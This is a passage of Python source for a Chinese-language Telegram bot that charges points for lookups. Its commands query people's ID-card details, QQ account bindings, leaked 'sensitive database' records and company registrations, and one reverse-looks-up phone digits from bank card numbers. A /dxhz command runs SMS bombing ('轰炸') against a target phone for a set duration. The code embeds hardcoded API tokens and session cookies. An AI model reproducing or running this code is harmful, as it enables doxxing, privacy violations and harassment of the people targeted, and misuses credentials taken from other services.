          'sec-ch-ua-mobile': "?1",
          'x-requested-with': "mark.via",
          'sec-fetch-site': "same-origin",
          'sec-fetch-mode': "cors",
          'sec-fetch-dest': "empty",
          'referer': "https://fm.sucyan.top/tool/box/qbind.php",
          'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
          'priority': "u=1, i",
          'Cookie': "SITE_TOTAL_ID=fe8f19dc57085512c134cfe23ccc9142"
        }
        response = requests.get(url, params=params, headers=headers)
        result = response.text
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] QQ号:{qq_number} 结果:{result}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)
        await update.message.reply_text(result)
    except:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text("查询异常❌，已退还2积分")

async def fr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return
    try:
        credit_code = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/fr 统一信用代码")
        return
    if data[user_id]["积分"] < 5:
        await update.message.reply_text("❌ 积分不足！查询需要5积分。")
        return
    data[user_id]["积分"] -= 5
    save_data(data)
    await update.message.reply_text("正在查询法人信息，请稍候...")
    def format_company_data(company_data):
        formatted = {
            "基本信息": {
                "公司名称": company_data.get("name", "无"),
                "统一社会信用代码": company_data.get("creditCode", "无"),
                "注册号": company_data.get("regNumber", "无"),
                "组织机构代码": company_data.get("orgNumber", "无"),
                "成立日期": company_data.get("estiblishTimeShowStr", "无"),
                "企业类型": company_data.get("companyOrgType", "无"),
                "经营状态": company_data.get("regStatus", "无"),
                "注册资本": company_data.get("regCapitalShowStr", "无"),
                "登记机关": company_data.get("registerInstitute", "无"),
                "企业规模": company_data.get("companyScale", "无")
            },
            "法定代表人": {
                "姓名": company_data.get("legalPersonName", "无"),
                "职位": company_data.get("legalPersonShowStr", "无")
            },
            "联系方式": {
                "电话": company_data.get("phone", "无"),
                "邮箱": company_data.get("emails", "无"),
                "网址": company_data.get("websites", "无")
            },
            "经营信息": {
                "经营范围": company_data.get("businessScope", "无"),
                "所属行业": company_data.get("categoryStr", "无"),
                "详细地址": company_data.get("regLocation", "无"),
                "省份": company_data.get("base", "无"),
                "城市": company_data.get("city", "无"),
                "区县": company_data.get("district", "无")
            },
            "风险信息": {
                "自身风险": company_data.get("selfRiskCount", 0),
                "关联风险": company_data.get("relatedRiskCount", 0),
                "历史风险": company_data.get("historyRiskCount", 0)
            }
        }
        return formatted
    def build_msg(d):
        msg = ""
        for k1, v1 in d.items():
            msg += f"\n【{k1}】\n"
            for k2, v2 in v1.items():
                msg += f"{k2}：{v2}\n"
        return msg.strip()
    try:
        url = "https://capi.tianyancha.com/cloud-tempest/app/searchCompany"
        headers = {
            "X-AUTH-TOKEN": "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIxODkyOTQyNTM4NiIsImlhdCI6MTc1MzYxODgzNSwiZXhwIjoxNzU2MjEwODM1fQ.GXXkSh57yWE_bO_cCoh157lw6ZneEf2WWps5T_UqPvwIhYxOKLw0VYm_rXT4oe6THSyRnL8oPv3Lzb7RT9Zbag",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.47(0x18002f2c) NetType/WIFI Language/zh_CN",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Host": "capi.tianyancha.com",
            "version": "TYC-XCX-WX",
            "Referer": "https://servicewechat.com/wx9f2867fc22873452/125/page-frame.html",
            "content-type": "application/json",
            "Authorization": "0###oo34J0eKmwZ2dziXSAWUtKRQi6Kk###1753618144609###4cce55c68fd91cbcc10191da0798b93c"
        }
        payload = {
            "sortType": 0,
            "pageSize": 20,
            "pageNum": 1,
            "word": credit_code,
            "allowModifyQuery": 1
        }
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        response.raise_for_status()
        data_json = response.json()
        if data_json.get("state") == "ok" and data_json.get("data", {}).get("companyList"):
            company = data_json["data"]["companyList"][0]
            formatted_data = format_company_data(company)
            res_msg = build_msg(formatted_data)
        else:
            res_msg = "未找到匹配的公司信息"
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 统一信用代码:{credit_code} 结果:{res_msg}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)
        await update.message.reply_text(f"📊 法人查询结果：\n{res_msg}")
    except Exception:
        data[user_id]["积分"] += 5
        save_data(data)
        await update.message.reply_text("❌ 查询异常，已退还5积分")

 
async def tqyb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return
    try:
        city = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/tqyb 市名")
        return
    if data[user_id]["积分"] < 2:
        await update.message.reply_text("❌ 积分不足！该功能需要2积分。")
        return
    data[user_id]["积分"] -= 2
    save_data(data)
    await update.message.reply_text("正在查询天气，请稍候...")
    try:
        url = "https://sucyan.top/api/tianqi.php"
        params = {
          'city': city
        }
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
          'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          'Accept-Encoding': "gzip, deflate, br, zstd",
          'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
          'sec-ch-ua-mobile': "?1",
          'sec-ch-ua-platform': "\"Android\"",
          'upgrade-insecure-requests': "1",
          'x-requested-with': "mark.via",
          'sec-fetch-site': "cross-site",
          'sec-fetch-mode': "navigate",
          'sec-fetch-user': "?1",
          'sec-fetch-dest': "document",
          'referer': "https://sucyan.us.ci/",
          'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
          'priority': "u=0, i",
          'Cookie': "PHPSESSID=k3vusddqhdj4953ila6hkmc9g3"
        }
        response = requests.get(url, params=params, headers=headers)
        result = response.text
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 城市:{city} 结果:{result}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)
        await update.message.reply_text(result)
    except:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text("查询异常❌，已退还2积分")

async def wzxx(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return
    try:
        weburl = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/wzxx 网站")
        return
    if data[user_id]["积分"] < 3:
        await update.message.reply_text("❌ 积分不足！该功能需要3积分。")
        return
    data[user_id]["积分"] -= 3
    save_data(data)
    await update.message.reply_text("正在查询网站信息，请稍候...")
    try:
        api_url = "https://sucyan.top/api/getmeta.php"
        params = {
          'url': weburl
        }
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
          'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          'Accept-Encoding': "gzip, deflate, br, zstd",
          'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
          'sec-ch-ua-mobile': "?1",
          'sec-ch-ua-platform': "\"Android\"",
          'upgrade-insecure-requests': "1",
          'dnt': "1",
          'x-requested-with': "mark.via",
          'sec-fetch-site': "none",
          'sec-fetch-mode': "navigate",
          'sec-fetch-user': "?1",
          'sec-fetch-dest': "document",
          'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
          'priority': "u=0, i"
        }
        response = requests.get(api_url, params=params, headers=headers)
        result = response.text
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 网站:{weburl} 结果:{result}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)
        await update.message.reply_text(result)
    except:
        data[user_id]["积分"] += 3
        save_data(data)
        await update.message.reply_text("查询异常❌，已退还3积分")

async def dxhz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用功能。")
        return
    try:
        phone = context.args[0]
        times = context.args[1]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/dxhz 手机号 时长")
        return
    if data[user_id]["积分"] < 5:
        await update.message.reply_text("❌ 积分不足！该功能需要5积分。")
        return
    data[user_id]["积分"] -= 5
    save_data(data)
    await update.message.reply_text("正在执行轰炸，请稍候...")
    try:
        url = "http://qilange.518721.xyz/qy/dxyh.php"
        params = {
            'phone': phone,
            'time': times,
            'key': "999"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': "gzip, deflate",
            'Upgrade-Insecure-Requests': "1",
            'dnt': "1",
            'X-Requested-With': "mark.via",
            'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        response = requests.get(url, params=params, headers=headers)
        res = response.text.strip()
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 手机号:{phone} 时长:{times} 结果:{res}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)
        if res == '{"code":0,"msg":"提交成功"}':
            await update.message.reply_text(f"手机号:{phone}\n时长:{times}分钟\n轰炸成功✅")
        else:
            await update.message.reply_text(f"手机号:{phone}\n时长:{times}分钟\n轰炸失败❌")
    except:
        data[user_id]["积分"] += 5
        save_data(data)
        await update.message.reply_text("执行异常❌，已退还5积分")

async def sfzjx(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()

    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return

    try:
        number = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/sfzjx 身份证号")
        return

    if data[user_id]["积分"] < 3:
        await update.message.reply_text("❌ 积分不足！查询需要3积分。")
        return

    data[user_id]["积分"] -= 3
    save_data(data)
    await update.message.reply_text("正在解析身份证，请稍候...")

    try:
        print("救赎")
        url = "https://api.suyanw.cn/api/sfzcx.php"
        params = {
          'number': number
        }
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
          'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          'Accept-Encoding': "gzip, deflate, br, zstd",
          'cache-control': "max-age=0",
          'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
          'sec-ch-ua-mobile': "?1",
          'sec-ch-ua-platform': "\"Android\"",
          'upgrade-insecure-requests': "1",
          'dnt': "1",
          'x-requested-with': "mark.via",
          'sec-fetch-site': "none",
          'sec-fetch-mode': "navigate",
          'sec-fetch-user': "?1",
          'sec-fetch-dest': "document",
          'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
          'priority': "u=0, i",
          'Cookie': "acw_tc=6f2bab9d17801244533084986e5ce6269bf98cf30e8eba08f43220a7a3; cdn_sec_tc=6f2bab9d17801244533084986e5ce6269bf98cf30e8eba08f43220a7a3; server_name_session=aeaf407e7bc305a6dabc402ea4973271; darkMode=false"
        }
        response = requests.get(url, params=params, headers=headers, timeout=30)
        result_text = response.text

        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 身份证:{number} 结果:{result_text}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)

        await update.message.reply_text(f"📊 身份证解析结果：\n{result_text}")
    except Exception:
        data[user_id]["积分"] += 3
        save_data(data)
        await update.message.reply_text("❌ 查询异常，已退还3积分")

async def kf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()

    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return

    try:
        cardNumber = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/kf 银行卡号")
        return

    if data[user_id]["积分"] < 3:
        await update.message.reply_text("❌ 积分不足！查询需要3积分。")
        return

    data[user_id]["积分"] -= 3
    save_data(data)
    await update.message.reply_text("正在卡反模糊前三后四，请稍候...")

    try:
        print("救赎")
        url = "https://static.95516.com/portal/ajax/getClosePaymentInfo.do"
        params = {
          'r': "0.46030884750711876",
          'cardNumber': cardNumber
        }
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
          'Accept': "text/plain, */*; q=0.01",
          'Accept-Encoding': "gzip, deflate, br, zstd",
          'sec-ch-ua-platform': "\"Android\"",
          'X-Requested-With': "XMLHttpRequest",
          'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
          'sec-ch-ua-mobile': "?1",
          'Sec-Fetch-Site': "same-origin",
          'Sec-Fetch-Mode': "cors",
          'Sec-Fetch-Dest': "empty",
          'Referer': "https://static.95516.com/portal/payment/closePayment.do",
          'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
          'Cookie': "UPJSESSIONID=e49db876-3044-4515-bc81-e291da67bcf0"
        }
        response = requests.get(url, params=params, headers=headers, timeout=30)
        result_text = response.text

        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 银行卡号:{cardNumber} 结果:{result_text}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)

        await update.message.reply_text(f"📊 卡反模糊手机号结果：\n{result_text}")
    except Exception:
        data[user_id]["积分"] += 3
        save_data(data)
        await update.message.reply_text("❌ 查询异常，已退还3积分")

async def mg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return
    try:
        sfz = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/mg 身份证号")
        return
    if data[user_id]["积分"] < 2:
        await update.message.reply_text("❌ 积分不足！查询需要2积分。")
        return
    data[user_id]["积分"] -= 2
    save_data(data)
    await update.message.reply_text("正在查询敏感库，请稍候...")
    try:
        url = "http://xiaowunb.top/mghy.php"
        params = {
            'sfz': sfz
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': "gzip, deflate",
            'Cache-Control': "max-age=0",
            'Upgrade-Insecure-Requests': "1",
            'dnt': "1",
            'X-Requested-With': "mark.via",
            'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': "PHPSESSID=osbth641dph99ivi6e8as7sfu0"
        }
        response = requests.get(url, params=params, headers=headers, timeout=10)
        response.encoding = 'utf-8'
        result = response.text

        ads_to_remove = [
            "💫小无API",
            "💫官方频道:@XWGFTG",
            "💫官方客服:@XWYPW"
        ]
        for ad in ads_to_remove:
            result = result.replace(ad, "")

        result = re.sub(r'\n\s*\n', '\n', result)
        result = result.strip()

        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 身份证:{sfz} 结果:{result}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)

        await update.message.reply_text(f"📊 敏感库查询结果：\n{result}")
    except Exception:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text("❌ 查询异常，已退还2积分")
                               
async def add_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("⛔ 权限不足，仅管理员可使用。")
        return
    
    try:
        target_id = str(context.args[0])
        points = int(context.args[1])
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/add <用户ID> <积分数量>")
        return
    
    data = load_data()
    if target_id not in data:
        await update.message.reply_text("❌ 用户未注册。")
        return
    
    data[target_id]["积分"] += points
    save_data(data)
    await update.message.reply_text(f"✅ 已为用户 {target_id} 增加 {points} 积分。\n{get_user_display(data[target_id])}")

async def clear_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("⛔ 权限不足。")
        return
    
    try:
        target_id = str(context.args[0])
    except IndexError:
        await update.message.reply_text("❌ 用法：/bdd <用户ID>")
        return
    
    data = load_data()
    if target_id not in data:
        await update.message.reply_text("❌ 用户未注册。")
        return
    
    data[target_id]["积分"] = 0
    save_data(data)
    await update.message.reply_text(f"✅ 已清零用户 {target_id} 的积分。\n{get_user_display(data[target_id])}")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("⛔ 权限不足。")
        return
    
    try:
        target_id = str(context.args[0])
    except IndexError:
        await update.message.reply_text("❌ 用法：/ban <用户ID>")
        return
    
    data = load_data()
    if target_id not in data:
        await update.message.reply_text("❌ 用户未注册。")
        return
    
    data[target_id]["封禁"] = True
    save_data(data)
    await update.message.reply_text(f"⛔ 已封禁用户 {target_id}。")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("⛔ 权限不足。")
        return
    
    try:
        target_id = str(context.args[0])
    except IndexError:
        await update.message.reply_text("❌ 用法：/jie <用户ID>")
        return
    
    data = load_data()
    if target_id not in data:
        await update.message.reply_text("❌ 用户未注册。")
        return
    
    data[target_id]["封禁"] = False
    save_data(data)
    await update.message.reply_text(f"✅ 已解封用户 {target_id}。")

async def clear_all_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("⛔ 权限不足。")
        return
    data = load_data()
    for uid in data:
        data[uid]["查询内容"] = ""
    save_data(data)
    await update.message.reply_text("已清空所有用户查询数据")

async def check_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user:
        user_id = str(update.effective_user.id)
        data = load_data()
        if user_id in data and data[user_id].get("封禁", False):
            await update.message.reply_text("⛔ 您已被封禁，无法使用机器人。")
            return True
    return False

def banned_wrapper(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if await check_ban(update, context):
            return
        await func(update, context)
    return wrapper

def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", handle_start_param))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("qd", banned_wrapper(checkin)))
    app.add_handler(CommandHandler("invite", banned_wrapper(invite)))
    app.add_handler(CommandHandler("2ys1", erys_one))
    app.add_handler(CommandHandler("2ys2", erys_two))
    app.add_handler(CommandHandler("2ys3", erys_three))
    app.add_handler(CommandHandler("3ys", three_ys))
    app.add_handler(CommandHandler("hpjy", hpjy))
    app.add_handler(CommandHandler("yxcy", yxcy))
    app.add_handler(CommandHandler("kb", kb))
    app.add_handler(CommandHandler("mn", mn))
    app.add_handler(CommandHandler("sj", sj))
    app.add_handler(CommandHandler("qb", qb))
    app.add_handler(CommandHandler("fr", fr))
    app.add_handler(CommandHandler("tqyb", tqyb))
    app.add_handler(CommandHandler("wzxx", wzxx))
    app.add_handler(CommandHandler("dxhz", dxhz))
    app.add_handler(CommandHandler("sfzjx", sfzjx))
    app.add_handler(CommandHandler("kf", kf))
    app.add_handler(CommandHandler("mg", mg))
    
    app.add_handler(CommandHandler("add", add_points))
    app.add_handler(CommandHandler("bdd", clear_points))
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("jie", unban_user))
    app.add_handler(CommandHandler("test", clear_all_data))
    
    app.run_polling()

if __name__ == "__main__":
    main()
